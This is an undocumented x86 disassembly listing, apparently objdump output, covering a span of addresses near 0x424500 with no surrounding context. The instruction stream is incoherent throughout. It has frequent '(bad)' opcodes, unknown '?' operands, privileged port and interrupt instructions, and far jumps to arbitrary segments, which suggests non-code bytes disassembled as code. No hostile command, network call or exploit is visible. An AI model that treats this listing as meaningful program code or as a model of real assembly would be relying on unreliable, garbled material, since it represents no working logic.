  4244a9:	sar    BYTE PTR [ebp+0x218e2ca7],1
  4244af:	jge    0x42448f
  4244b1:	lahf   
  4244b2:	dec    edx
  4244b3:	push   0x6d
  4244b5:	mov    ?,WORD PTR [eax]
  4244b7:	fs aas 
  4244b9:	ds pop ss
  4244bb:	mov    eax,0x2c704214
  4244c0:	cmp    al,0x9a
  4244c2:	or     al,0xc5
  4244c4:	mov    eax,0xf0b64a90
  4244c9:	rcl    DWORD PTR [ecx+0x5a8e9f46],1
  4244cf:	push   eax
  4244d0:	jg     0x424458
  4244d2:	and    BYTE PTR [ebp+eiz*2+0x7c87f9f0],0xfa
  4244da:	xor    al,0x90
  4244dc:	ins    DWORD PTR es:[edi],dx
  4244dd:	into   
  4244de:	sub    eax,0x757fbf24
  4244e3:	jg     0x424520
  4244e5:	inc    edi
  4244e6:	cmp    eax,0x7ca36486
  4244eb:	fnstsw WORD PTR [esp+eiz*8-0x2344ed69]
  4244f2:	mov    eax,ds:0x629815d8
  4244f7:	dec    ebp
  4244f8:	xchg   esp,eax
  4244f9:	mov    ds:0x71c5cf67,eax
  4244fe:	and    eax,0x34d7bf9f
  424503:	into   
  424504:	add    al,0x1c
  424506:	clc    
  424507:	adc    DWORD PTR [edx],0x7f0b1805
  42450d:	(bad)  
  42450e:	sub    DWORD PTR [ebx-0xc7678bb],edx
  424514:	jl     0x4244d8
  424516:	call   FWORD PTR [esp+eiz*2]
  424519:	loopne 0x424512
  42451b:	lahf   
  42451c:	xor    eax,0x9865c8fc
  424521:	sbb    eax,0x6eb8dcb6
  424526:	enter  0xfd7b,0xcc
  42452a:	sub    cl,BYTE PTR [ebx+0x576655d3]
  424530:	xchg   esi,eax
  424531:	pop    eax
  424532:	lods   al,BYTE PTR ds:[esi]
  424533:	pop    ss
  424534:	sbb    eax,0x6cf7e261
  424539:	call   0xe8ae96c
  42453e:	xchg   BYTE PTR [edi+0x7bce385e],bl
  424544:	pop    edi
  424545:	dec    BYTE PTR [esi-0x12]
  424548:	pop    ebp
  424549:	mov    ebx,0x93c1588b
  42454e:	iret   
  42454f:	sub    bl,BYTE PTR [edi+0x262dfedb]
  424555:	jmp    0x18097086
  42455a:	adc    DWORD PTR ds:0x91ad8766,edx
  424560:	sar    BYTE PTR [esi-0x77d272f8],cl
  424566:	imul   ebp,ebp,0xffffffca
  424569:	fwait
  42456a:	xchg   edi,eax
  42456b:	pop    ebp
  42456c:	mov    bh,0x75
  42456e:	add    ch,BYTE PTR [esi]
  424570:	push   ds
  424571:	inc    edi
  424572:	jnp    0x4245b5
  424574:	loopne 0x4245d5
  424576:	std    
  424577:	mov    esi,0x6c15fa42
  42457c:	das    
  42457d:	sbb    al,0x1
  42457f:	add    bh,bl
  424581:	std    
  424582:	mov    DWORD PTR [edi],ebx
  424584:	fdivr  DWORD PTR [edi+edi*8+0x2b]
  424588:	(bad)  
  424589:	fidiv  DWORD PTR [esi-0x65b4a2da]
  42458f:	les    edx,FWORD PTR [esi-0x4d]
  424592:	lods   eax,DWORD PTR ds:[esi]
  424593:	int3   
  424594:	jmp    FWORD PTR [edi-0x7ebde5fe]
  42459a:	push   esp
  42459b:	xchg   edx,eax
  42459c:	mov    ch,0x3
  42459e:	ss (bad) 
  4245a0:	fst    DWORD PTR [edx+0x15]
  4245a3:	lahf   
  4245a4:	pop    esi
  4245a5:	popf   
  4245a6:	add    ebp,DWORD PTR [eax]
  4245a8:	push   ecx
  4245a9:	add    edi,DWORD PTR [edi]
  4245ab:	sub    bl,BYTE PTR [ebx-0x49]
  4245ae:	fwait
  4245af:	ret    0xd902
  4245b2:	xor    dl,BYTE PTR [esi-0x104e8724]
  4245b8:	test   BYTE PTR [esi-0x77],bh
  4245bb:	lea    ecx,[edi]
  4245bd:	pop    ds
  4245be:	jecxz  0x42456d
  4245c0:	fcomip st,st(6)
  4245c2:	dec    esi
  4245c3:	jle    0x4245c0
  4245c5:	shr    BYTE PTR [edi+0x71],cl
  4245c8:	jo     0x4245b4
  4245ca:	sub    edx,ebx
  4245cc:	or     ecx,DWORD PTR ds:0xc129c593
  4245d2:	cmp    ebp,ebx
  4245d4:	adc    bh,BYTE PTR [ebp-0x596aaeb2]
  4245da:	mov    dl,0x6b
  4245dc:	not    DWORD PTR [ecx]
  4245de:	jmp    0x4245bd
  4245e0:	xchg   ebp,eax
  4245e1:	mov    dl,0x6f
  4245e3:	pop    ecx
  4245e4:	and    ecx,ecx
  4245e6:	pop    ss
  4245e7:	push   0x53
  4245e9:	lods   al,BYTE PTR ds:[esi]
  4245ea:	aas    
  4245eb:	add    BYTE PTR [eax],ah
  4245ed:	xchg   ebp,eax
  4245ee:	xor    bl,BYTE PTR [ebp-0x36543a2a]
  4245f4:	imul   ecx,edi,0x17a75931
  4245fa:	adc    BYTE PTR [edi-0x5],cl
  4245fd:	(bad)
  424600:	loope  0x424607
  424602:	cmp    al,0x43
  424604:	(bad)  
  424605:	and    al,0xcb
  424607:	inc    esi
  424608:	dec    esp
  424609:	gs fxtract 
  42460c:	and    BYTE PTR [eax],0x82
  42460f:	xchg   esp,eax
  424610:	inc    ebp
  424611:	xor    eax,0xa6c20af2
  424616:	sub    al,0x6d
  424618:	sub    BYTE PTR [ebx+edi*1],0x50
  42461c:	xchg   ebx,esi
  42461e:	in     al,0x89
  424620:	sub    esp,esi
  424622:	jp     0x424609
  424624:	mov    DWORD PTR [edi],ebx
  424626:	retf   0xb8f8
  424629:	xor    dl,BYTE PTR [eax]
  42462b:	lds    edi,FWORD PTR [edx+0x3bd8f8f3]
  424631:	cli    
  424632:	lock cmc 
  424634:	sub    BYTE PTR [ecx],0x4b
  424637:	jge    0x42466c
  424639:	cmp    ah,BYTE PTR [ebp+0x25d183bf]
  42463f:	shl    BYTE PTR [ebx-0x16],0x8b
  424643:	nop
  424644:	test   al,0x78
  424646:	sub    al,BYTE PTR [ebp+0x7e]
  424649:	addr16 stc 
  42464b:	call   0x82ee:0xeb642c19
  424652:	call   0x67d:0x7eaa91c3
  424659:	in     eax,0xeb
  42465b:	sti    
  42465c:	sub    eax,0x13c0c272
  424661:	pop    eax
  424662:	repz jmp 0xd72aca89
  424668:	cmp    eax,0xd794529
  42466d:	xchg   esi,eax
  42466e:	aas    
  42466f:	fild   QWORD PTR [edi-0x689f50c2]
  424675:	mov    esp,0xc87a348a
  42467a:	rol    DWORD PTR [ebx],1
  42467c:	sub    bl,BYTE PTR [edx-0x2e]
  42467f:	mov    ds:0xfe53e7c5,al
  424684:	jle    0x4246fc
  424686:	inc    ebp
  424687:	xor    eax,0xfd7db29
  42468c:	cmp    BYTE PTR [esi-0x7a555ac6],dh
  424692:	lods   eax,DWORD PTR ds:[esi]
  424693:	stos   DWORD PTR es:[edi],eax
  424694:	ret    0xdedb
  424697:	std    
  424698:	mov    ch,0x7c
  42469a:	mul    dl
  42469c:	add    ebx,DWORD PTR [edx+edi*4-0x42]
  4246a0:	add    DWORD PTR [eax+ebp*4],0xab7fb593
  4246a7:	pushf  
  4246a8:	xchg   DWORD PTR [ecx-0x7],edi
  4246ab:	jmp    0x3e4a:0xf93bee39
  4246b2:	stc    
  4246b3:	call   0xca3ff7a7
  4246b8:	push   edi
  4246b9:	adc    ch,BYTE PTR [edi+0x2fee8bdc]
  4246bf:	mov    cl,0x50
  4246c1:	lods   eax,DWORD PTR ds:[esi]
  4246c2:	fidiv  DWORD PTR ds:0x7bb3b083
  4246c8:	push   0x5955481e
  4246cd:	fwait
  4246ce:	cmp    DWORD PTR [edi-0x7a],edi
  4246d1:	dec    esp
  4246d2:	push   eax
  4246d3:	imul   DWORD PTR [ebx]
  4246d5:	fucomi st,st(0)
  4246d7:	jle    0x42467d
  4246d9:	jg     0x42474d
  4246db:	or     eax,0xf33e9091
  4246e0:	mov    cl,0xff
  4246e2:	repnz (bad) 
  4246e5:	sub    al,0x8f
  4246e7:	das    
  4246e8:	fs jnp 0x42473c
  4246eb:	or     ah,al
  4246ed:	jge    0x42468f
  4246ef:	inc    DWORD PTR [edi+0x5d]
  4246f2:	aas    
  4246f3:	xchg   esp,eax
  4246f4:	mov    bh,bl
  4246f6:	inc    eax
  4246f7:	inc    esp
  4246f8:	lods   al,BYTE PTR ds:[esi]
  4246f9:	xor    eax,0xabff0614
  4246fe:	inc    eax
  4246ff:	or     BYTE PTR [ecx+0x11aa2954],al
  424705:	xchg   ebp,eax
  424706:	popa   
  424707:	dec    ecx
  424708:	stos   DWORD PTR es:[edi],eax
  424709:	and    ecx,DWORD PTR [eax]
  42470b:	jmp    DWORD PTR [esi-0x48]
  42470e:	out    dx,eax
  42470f:	mov    ds:0xb183dc5f,eax
  424714:	nop
  424715:	(bad)  
  424717:	test   DWORD PTR [esi+ebp*1+0x19],ecx
  42471b:	ror    DWORD PTR [edi+0x55],0x57
  42471f:	sbb    al,0x5b
  424721:	pop    ebx
  424722:	gs sti 
  424724:	mov    eax,ds:0x664c793b
  424729:	mov    esp,0x2b7c4ff3
  42472e:	mov    edi,0x9c8bf8b1
  424733:	jnp    0x42472b
  424735:	push   ds
  424736:	mov    edx,0xd8e567b6
  42473b:	add    bl,bl
  42473d:	aaa    
  42473e:	pop    edx
  42473f:	bound  ecx,QWORD PTR [eax+ebp*4+0x56]
  424743:	aam    0xae
  424745:	lahf   
  424746:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424747:	bound  ebp,QWORD PTR [ebp-0xf60c569]
  42474d:	push   esi
  42474e:	push   ds
  42474f:	fsub   QWORD PTR [ebx+0x16559821]
  424755:	mov    eax,ds:0x7f66acae
  42475a:	cmp    ch,BYTE PTR [ecx+0x2e7522dc]
  424760:	and    al,0x9
  424762:	inc    edx
  424763:	sbb    DWORD PTR [edx-0x75],0xffffff9e
  424767:	adc    bh,dh
  424769:	or     DWORD PTR [edx],edx
  42476b:	sub    al,0x57
  42476d:	pop    edi
  42476e:	sbb    al,0x2e
  424770:	mov    ebx,DWORD PTR [edi-0x5313b3a8]
  424776:	push   ds
  424777:	daa    
  424778:	inc    ebx
  424779:	dec    esp
  42477a:	inc    eax
  42477b:	sbb    al,0x61
  42477d:	nop
  42477e:	add    eax,0x5255cf13
  424783:	pop    ebx
  424784:	cli    
  424785:	pop    esp
  424786:	int3   
  424787:	jge    0x424751
  424789:	cdq    
  42478a:	std    
  42478b:	mov    ecx,0x162e5ae5
  424790:	dec    ebx
  424791:	and    al,0x42
  424793:	xchg   edx,eax
  424794:	fdiv   QWORD PTR [edx+0xe2ef4df]
  42479a:	popf   
  42479b:	shl    al,cl
  42479d:	and    dl,BYTE PTR [edi+edi*1]
  4247a0:	aaa    
  4247a1:	or     eax,0x4e40344c
  4247a6:	push   0x2
  4247a8:	ja     0x4247d5
  4247aa:	xchg   edx,eax
  4247ab:	cli    
  4247ac:	clc    
  4247ad:	fwait
  4247ae:	xor    al,0x5b
  4247b0:	and    ecx,DWORD PTR [edx-0x34]
  4247b3:	add    eax,0x941ddf29
  4247b8:	jne    0x4247ab
  4247ba:	push   cs
  4247bb:	mov    ?,esp
  4247bd:	call   0x4311eed2
  4247c2:	in     eax,dx
  4247c3:	dec    edx
  4247c4:	stos   BYTE PTR es:[edi],al
  4247c5:	clc    
  4247c6:	retf   
  4247c7:	mov    es,WORD PTR [edx+esi*4-0x55]
  4247cb:	outs   dx,BYTE PTR ds:[esi]
  4247cc:	popf   
  4247cd:	fwait
  4247ce:	jno    0x4247b1
  4247d0:	push   cs
  4247d1:	xchg   esp,eax
  4247d2:	(bad)  
  4247d3:	pop    edi
  4247d4:	lds    edi,FWORD PTR [edi-0x6316ee29]
  4247da:	push   es
  4247db:	xlat   BYTE PTR ds:[ebx]
  4247dc:	and    edi,ebx
  4247de:	ret    
  4247df:	xchg   ecx,eax
  4247e0:	jo     0x424801
  4247e2:	in     eax,0x66
  4247e4:	retf   0x29ac
  4247e7:	push   eax
  4247e8:	fistp  QWORD PTR [edi]
  4247ea:	xchg   ebx,eax
  4247eb:	repnz add al,0x3
  4247ee:	sbb    al,0xbe
  4247f0:	dec    ecx
  4247f1:	clc    
  4247f2:	pop    es
  4247f3:	push   edi
  4247f4:	add    BYTE PTR [edx+0x2e],0xc6
  4247f8:	sbb    BYTE PTR [ecx+0x64f6b82a],ch
  4247fe:	mov    DWORD PTR [edi+0x7f],0x5cee31e3
  424805:	jp     0x424824
  424807:	outs   dx,DWORD PTR ds:[esi]
  424808:	mov    ebp,0x70786bff
  42480d:	jmp    0x424870
  42480f:	sahf   
  424810:	fidivr WORD PTR [esi+eax*1+0x5a]
  424814:	pop    ebx
  424815:	mov    ch,dh
  424817:	lea    esp,[edi-0x12]
  42481a:	mov    ds:0x5f9670bd,eax
  42481f:	cli    
  424820:	int    0xd
  424822:	hlt    
  424823:	mov    bh,0xbe
  424825:	mov    edi,DWORD PTR [edx]
  424827:	xor    al,0x1c
  424829:	pop    ebx
  42482a:	ins    BYTE PTR es:[edi],dx
  42482b:	test   al,0xd7
  42482d:	inc    ebx
  42482e:	pop    ecx
  42482f:	pop    ebp
  424830:	dec    eax
  424831:	push   ebx
  424832:	mov    ds:0xb055236d,al
  424837:	out    0xb2,al
  424839:	push   edx
  42483a:	inc    ecx
  42483b:	test   al,0x83
  42483d:	and    edi,DWORD PTR [ebx]
  42483f:	lods   al,BYTE PTR ds:[esi]
  424840:	repz mov bl,0xd5
  424843:	stos   DWORD PTR es:[edi],eax
  424844:	mov    ds:0x42a95797,eax
  424849:	fnsave [edx-0x75]
  42484c:	mov    dh,0x17
  42484e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42484f:	add    BYTE PTR [eax+edi*4],al
  424852:	mov    bl,0xa
  424854:	mov    edi,0x1bfeba9e
  424859:	repnz rcr dh,cl
  42485c:	mov    ecx,0x40904037
  424861:	test   al,0x2c
  424863:	adc    dl,BYTE PTR [eax+0x70ba922d]
  424869:	addr16 mov ds:0xbcff,eax
  42486d:	ror    DWORD PTR ds:[eax-0x8],0xcb
  424872:	xchg   esi,ebx
  424874:	ds ins BYTE PTR es:[edi],dx
  424876:	pushf  
  424877:	sbb    DWORD PTR [eax-0x24],ebx
  42487a:	xor    eax,0x4bb19657
  42487f:	in     al,dx
  424880:	outs   dx,DWORD PTR ds:[esi]
  424881:	iret   
  424882:	pop    ecx
  424883:	cmp    al,0x36
  424885:	inc    ebp
  424886:	rcr    BYTE PTR [ecx],cl
  424888:	jbe    0x4248a9
  42488a:	pop    edx
  42488b:	in     al,0xb3
  42488d:	std    
  42488e:	jecxz  0x42484c
  424890:	cld    
  424891:	aam    0x7f
  424893:	int3   
  424894:	in     al,dx
  424895:	aam    0x26
  424897:	aaa    
  424898:	push   ds
  424899:	sahf   
  42489a:	ror    BYTE PTR [edi+ecx*8-0x50],cl
  42489e:	jbe    0x424912
  4248a0:	xchg   ecx,eax
  4248a1:	fstp   QWORD PTR [ebp-0x74941c6a]
  4248a7:	xchg   esi,eax
  4248a8:	inc    ebp
  4248a9:	sbb    ch,dl
  4248ab:	jnp    0x4248af
  4248ad:	pop    eax
  4248ae:	fnsave [ebp-0x79]
  4248b1:	jo     0x4248a0
  4248b3:	repnz mov WORD PTR [eax],ss
  4248b6:	loopne 0x42489c
  4248b8:	jmp    0x8f55f4c2
  4248bd:	jecxz  0x4248d4
  4248bf:	push   ecx
  4248c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4248c1:	or     bl,BYTE PTR [esi+ebx*1]
  4248c4:	into   
  4248c5:	or     DWORD PTR [esi+ecx*1],esp
  4248c8:	xlat   BYTE PTR ds:[ebx]
  4248c9:	mov    edi,0x8d3b3340
  4248ce:	sbb    al,0xde
  4248d0:	shl    DWORD PTR [edx+edx*2+0x31],0xa9
  4248d5:	stos   DWORD PTR es:[edi],eax
  4248d6:	loop   0x42492c
  4248d8:	or     DWORD PTR [edx+0x57],eax
  4248db:	dec    eax
  4248dc:	inc    ebp
  4248dd:	inc    ebx
  4248de:	int    0xe2
  4248e0:	ret    0xee45
  4248e3:	push   es
  4248e4:	in     al,dx
  4248e5:	push   esi
  4248e6:	popf   
  4248e7:	lods   al,BYTE PTR ds:[esi]
  4248e8:	js     0x4248b2
  4248ea:	cli    
  4248eb:	dec    edi
  4248ec:	mov    ebx,DWORD PTR [ebx-0x6b4c61ad]
  4248f2:	push   edi
  4248f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248f4:	bound  ecx,QWORD PTR [ebp-0x669dab14]
  4248fa:	mov    ah,BYTE PTR [eax+0x42]
  4248fd:	pop    ebp
  4248fe:	xor    esi,0xa3904ab9
  424904:	push   ss
  424905:	pop    ebp
  424906:	dec    ebp
  424907:	jno    0x42491d
  424909:	call   esi
  42490b:	jmp    0x42492e
  42490d:	push   es
  42490e:	inc    ebx
  42490f:	cwde   
  424910:	aas    
  424911:	sbb    ebx,DWORD PTR [edx-0x3c951bae]
  424917:	dec    esp
  424918:	in     al,dx
  424919:	gs push esp
  42491b:	xchg   edx,eax
  42491c:	iret   
  42491d:	push   edi
  42491e:	fsub   st(0),st
  424920:	push   ecx
  424921:	push   0xe5461c50
  424926:	outs   dx,BYTE PTR ds:[esi]
  424927:	mov    esp,0x822c3499
  42492c:	lea    ebx,[ebx-0xc]
  42492f:	sub    ch,al
  424931:	jne    0x4248ff
  424933:	int    0x39
  424935:	aam    0xe0
  424937:	push   ss
  424938:	cmp    DWORD PTR [ebx],ebp
  42493a:	xor    dh,BYTE PTR [edi-0x4]
  42493d:	leave  
  42493e:	(bad)  
  424940:	mov    ah,BYTE PTR [esi+0x11350734]
  424946:	jb     0x4249ba
  424948:	out    0x66,al
  42494a:	shl    DWORD PTR [edi+0xb79e5df],0xa
  424951:	aad    0x23
  424953:	lahf   
  424954:	jmp    0x42493e
  424956:	cwde   
  424957:	pushf  
  424958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424959:	pop    eax
  42495a:	mul    ch
  42495c:	mov    cl,0x16
  42495e:	out    0x31,eax
  424960:	jl     0x42499e
  424962:	push   edx
  424963:	push   edx
  424964:	stos   BYTE PTR es:[edi],al
  424965:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424966:	bound  edi,QWORD PTR [edx-0x1d]
  424969:	cmp    al,0xfc
  42496b:	cld    
  42496c:	lahf   
  42496d:	loop   0x424938
  42496f:	push   ebx
  424970:	(bad)  
  424971:	lock fs cld 
  424974:	cmp    bh,ah
  424976:	es ja  0x42496b
  424979:	lods   eax,DWORD PTR ds:[esi]
  42497a:	scas   eax,DWORD PTR es:[edi]
  42497b:	mov    ecx,0xe27d5f8f
  424980:	mov    ds:0x76ec7fdc,eax
  424985:	ss das 
  424987:	push   edi
  424988:	pop    esp
  424989:	cli    
  42498a:	call   0x6ff81323
  42498f:	inc    edi
  424990:	pop    ss
  424991:	xchg   esp,eax
  424992:	mov    ch,0x93
  424994:	retf   
  424995:	test   al,0x26
  424997:	out    0x7,al
  424999:	xor    esi,esi
  42499b:	ja     0x4249ac
  42499d:	jmp    0xec00e89c
  4249a2:	or     al,0xe1
  4249a4:	cli    
  4249a5:	loop   0x424959
  4249a7:	push   edx
  4249a8:	ret    0x9ee7
  4249ab:	icebp  
  4249ac:	cdq    
  4249ad:	xchg   esp,eax
  4249ae:	arpl   WORD PTR [edx+0x1595f1ca],di
  4249b4:	je     0x424a25
  4249b6:	cdq    
  4249b7:	push   eax
  4249b8:	aaa    
  4249b9:	xchg   edi,eax
  4249ba:	mov    eax,0x528bdb45
  4249bf:	add    BYTE PTR [edi-0x140bc9ca],dl
  4249c5:	stos   DWORD PTR es:[edi],eax
  4249c6:	lock retf 
  4249c8:	mov    ah,0xe9
  4249ca:	mov    edi,0xb9484a4d
  4249cf:	xor    BYTE PTR [eax+0x4205a906],ch
  4249d5:	test   DWORD PTR [esp+eiz*2+0x5e1a40ae],eax
  4249dc:	into   
  4249dd:	nop
  4249de:	sbb    dl,BYTE PTR [eax+0xd48b41f]
  4249e4:	xor    BYTE PTR [eax-0x6b9adaf8],bh
  4249ea:	xor    BYTE PTR [edx+edx*8-0x5d],cl
  4249ee:	fs inc eax
  4249f0:	mov    cl,0x5a
  4249f2:	sub    ecx,eax
  4249f4:	loope  0x424a37
  4249f6:	pop    es
  4249f7:	and    DWORD PTR [eax+0x7202154f],ebx
  4249fd:	cmc    
  4249fe:	sub    eax,0xe79fd46c
  424a03:	aad    0xdf
  424a05:	jle    0x42499c
  424a07:	mov    edx,DWORD PTR [edi]
  424a09:	dec    edi
  424a0a:	jae    0x424a01
  424a0c:	(bad)  [ebp+0x4e]
  424a0f:	fbstp  TBYTE PTR [ecx-0x66]
  424a12:	test   ebp,eax
  424a14:	call   0xf737:0xb643ddfd
  424a1b:	inc    eax
  424a1c:	and    BYTE PTR [edx+eiz*1-0x6e],cl
  424a20:	add    ch,BYTE PTR [eax-0x4c510590]
  424a26:	push   es
  424a27:	jne    0x424a2a
  424a29:	in     eax,dx
  424a2a:	adc    edx,DWORD PTR [edi+0x1400dd9e]
  424a30:	lods   eax,DWORD PTR ds:[esi]
  424a31:	jp     0x424aa5
  424a33:	dec    ebx
  424a34:	dec    esi
  424a35:	or     eax,0x67dee4ca
  424a3a:	cmp    DWORD PTR [ecx],edi
  424a3c:	pop    ebp
  424a3d:	mov    eax,ds:0x2d671bd
  424a42:	or     DWORD PTR [ebp+0x6b],ebp
  424a45:	and    DWORD PTR [edx],edi
  424a47:	add    DWORD PTR [ebp+0x66a164c0],edx
  424a4d:	popa   
  424a4e:	and    DWORD PTR [eax],edx
  424a50:	jmp    0x9db6:0x56db1b8a
  424a57:	and    bl,BYTE PTR [esi]
  424a59:	sbb    al,BYTE PTR ds:0x89023782
  424a5f:	shr    DWORD PTR ds:0x70eb5bb6,0xc4
  424a66:	mov    esi,0x5c96e797
  424a6b:	out    dx,al
  424a6c:	out    0x56,eax
  424a6e:	outs   dx,BYTE PTR ds:[esi]
  424a6f:	sub    BYTE PTR [edi-0x4d0ddcaa],dh
  424a75:	fnstenv [edi+0x45]
  424a78:	and    edi,DWORD PTR [ecx-0x7b]
  424a7b:	adc    DWORD PTR [edi-0x3bbae241],ecx
  424a81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a83:	stc    
  424a84:	cmp    DWORD PTR [edi-0x61],eax
  424a87:	fisttp DWORD PTR [edx-0x18]
  424a8a:	dec    esi
  424a8b:	bound  ecx,QWORD PTR [ecx]
  424a8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a8e:	fwait
  424a8f:	adc    BYTE PTR [esi+0x6b7392c4],cl
  424a95:	sub    DWORD PTR [ebx],ebp
  424a97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a98:	sbb    al,0xde
  424a9a:	jae    0x424b07
  424a9c:	sub    al,0x2e
  424a9e:	in     al,dx
  424a9f:	mov    cl,0x8
  424aa1:	mov    esi,0xe53d9f14
  424aa6:	addr16 dec ecx
  424aa8:	add    esp,edi
  424aaa:	nop
  424aab:	fstp   TBYTE PTR [eax-0x3f]
  424aae:	test   al,0x8f
  424ab0:	popa   
  424ab1:	cmp    eax,0x939c28ae
  424ab7:	sbb    BYTE PTR [edx],cl
  424ab9:	jge    0x424b2f
  424abb:	test   al,0x61
  424abd:	enter  0xf4cf,0x7c
  424ac1:	sub    DWORD PTR [ebp-0x3036aa27],edi
  424ac7:	cmp    al,0x16
  424ac9:	(bad)  
  424aca:	mov    cl,0xab
  424acc:	cdq    
  424acd:	xchg   ebp,eax
  424ace:	loopne 0x424b38
  424ad0:	nop
  424ad1:	mov    dh,al
  424ad3:	stos   DWORD PTR es:[edi],eax
  424ad4:	mov    eax,ds:0xec4a52af
  424ad9:	or     BYTE PTR [ebx],ah
  424adb:	(bad)
  424ade:	(bad)
  424ae3:	mov    bl,0x83
  424ae5:	sbb    DWORD PTR [edx-0x1b],edi
  424ae8:	pop    esi
  424ae9:	clc    
  424aea:	mov    DWORD PTR [edi-0x4e],edx
  424aed:	mov    cl,0x7c
  424aef:	mov    DWORD PTR [ebp-0x8c50289],ecx
  424af5:	lahf   
  424af6:	cld    
  424af7:	es outs dx,BYTE PTR cs:[esi]
  424afa:	cmp    eax,0x799ff5ca
  424aff:	and    edx,DWORD PTR [ebx+0x4ba676ee]
  424b05:	or     eax,0xdf454993
  424b0a:	inc    ebp
  424b0b:	mov    dh,0xb7
  424b0d:	jbe    0x424a98
  424b0f:	pop    ebp
  424b10:	dec    edi
  424b11:	push   esi
  424b12:	pop    edi
  424b13:	lds    edi,FWORD PTR [ebx-0x447dbaeb]
  424b19:	shl    BYTE PTR [ecx],1
  424b1b:	push   eax
  424b1c:	push   edi
  424b1d:	adc    eax,0xc288b04d
  424b22:	mov    esi,0x617560de
  424b27:	(bad)  
  424b28:	fstp   st(1)
  424b2a:	and    dh,BYTE PTR [ebx-0x790044e5]
  424b30:	pop    ebx
  424b31:	mov    ah,0xbd
  424b33:	sub    BYTE PTR ds:0xdb7cb000,al
  424b39:	cli    
  424b3a:	outs   dx,DWORD PTR ds:[esi]
  424b3b:	mov    bh,0x4f
  424b3d:	int3   
  424b3e:	and    dh,BYTE PTR [ecx]
  424b40:	push   ebp
  424b41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b42:	fcom   QWORD PTR [edi-0x5757bde6]
  424b48:	stos   BYTE PTR es:[edi],al
  424b49:	dec    eax
  424b4a:	or     ah,dl
  424b4c:	lea    ecx,[esp+ecx*8]
  424b4f:	dec    edi
  424b50:	jne    0x424bc5
  424b52:	ss mov dl,0xe6
  424b55:	jmp    0xdfb3:0x4800d9be
  424b5c:	pop    ebx
  424b5d:	cld    
  424b5e:	fild   WORD PTR [ecx]
  424b60:	sbb    al,0xdc
  424b62:	inc    esp
  424b63:	pop    ebx
  424b64:	cli    
  424b65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b66:	imul   DWORD PTR [edi-0x39]
  424b69:	ds mov cl,0xbf
  424b6c:	xor    esi,DWORD PTR [edi]
  424b6e:	pop    eax
  424b6f:	and    BYTE PTR [edx+0x55],al
  424b72:	add    DWORD PTR [edi],ecx
  424b74:	ffreep st(3)
  424b76:	(bad)  
  424b77:	loop   0x424b93
  424b79:	push   edi
  424b7a:	fcomip st,st(2)
  424b7c:	add    esi,edx
  424b7e:	ds icebp 
  424b80:	push   edi
  424b81:	mov    ecx,0x4d2af97e
  424b86:	adc    ebp,DWORD PTR [eax+0x53]
  424b89:	fs mov dh,0xfe
  424b8c:	cmp    BYTE PTR [ebx],bh
  424b8e:	scas   eax,DWORD PTR es:[edi]
  424b8f:	stc    
  424b90:	cmp    DWORD PTR [edx+eax*4-0x5c0062c9],esp
  424b97:	pop    esp
  424b98:	cld    
  424b99:	leave  
  424b9a:	sti    
  424b9b:	test   eax,0x9a56a615
  424ba0:	ins    DWORD PTR es:[edi],dx
  424ba1:	and    DWORD PTR [ebx-0x62009c42],ebp
  424ba7:	(bad)  
  424ba8:	cmp    ecx,ebp
  424baa:	icebp  
  424bab:	push   ss
  424bac:	xchg   ebp,eax
  424bad:	mov    es,WORD PTR [ebp-0x6c59ba1b]
  424bb3:	xchg   BYTE PTR [edi],dh
  424bb5:	fnsave [ebp+0x1f]
  424bb8:	(bad)  
  424bb9:	(bad)  
  424bba:	shl    DWORD PTR [edi+0x21],cl
  424bbd:	push   esp
  424bbe:	dec    esp
  424bbf:	fwait
  424bc0:	inc    eax
  424bc1:	cmp    ebp,edi
  424bc3:	fdivr  DWORD PTR [ecx]
  424bc5:	dec    BYTE PTR [ecx-0x56]
  424bc8:	mov    ch,0x5d
  424bca:	in     al,0xfa
  424bcc:	in     eax,dx
  424bcd:	in     al,dx
  424bce:	in     eax,dx
  424bcf:	ror    DWORD PTR cs:[ebp+0x75dcce75],0x1b
  424bd7:	jmp    0x424ba0
  424bd9:	daa    
  424bda:	(bad)  
  424bdc:	sahf   
  424bdd:	fwait
  424bde:	shl    ebx,0xd2
  424be1:	fist   WORD PTR [edx+0x71]
  424be4:	daa    
  424be5:	jno    0x424c0f
  424be7:	add    esi,esi
  424be9:	lds    ebx,FWORD PTR [esi-0x53]
  424bec:	in     eax,0x16
  424bee:	fidiv  WORD PTR [edx+0x3c]
  424bf1:	and    eax,DWORD PTR [ebx]
  424bf3:	sub    eax,0xa4177e4b
  424bf8:	adc    BYTE PTR [edx+0x614b3655],dh
  424bfe:	jae    0x424c57
  424c00:	mov    ebp,DWORD PTR [ebx-0x6e]
  424c03:	xlat   BYTE PTR ds:[ebx]
  424c04:	push   0xffffffc8
  424c06:	push   ebx
  424c07:	fst    QWORD PTR [esi+0x72581f30]
  424c0d:	sbb    eax,0xcdf29686
  424c12:	cwde   
  424c13:	and    ebx,esi
  424c15:	loopne 0x424be2
  424c17:	xchg   edi,eax
  424c18:	ja     0x424baf
  424c1a:	mov    ?,esi
  424c1c:	push   ds
  424c1d:	retf   0x4d78
  424c20:	clc    
  424c21:	jae    0x424bd7
  424c23:	rcr    BYTE PTR [ecx+eiz*1-0x11],cl
  424c27:	mov    bh,0x97
  424c29:	adc    eax,DWORD PTR [ebx-0x6f5be890]
  424c2f:	jns    0x424c74
  424c31:	les    edx,FWORD PTR [ebx]
  424c33:	dec    DWORD PTR [edx]
  424c35:	shr    ebp,1
  424c37:	jno    0x424bba
  424c39:	cld    
  424c3a:	test   BYTE PTR [ecx+0x11],0x7e
  424c3e:	inc    edi
  424c3f:	dec    edx
  424c40:	jecxz  0x424bf0
  424c42:	mov    esi,0x6190be65
  424c47:	jnp    0x424c27
  424c49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c4a:	inc    edi
  424c4b:	dec    edi
  424c4c:	pop    esi
  424c4d:	inc    edx
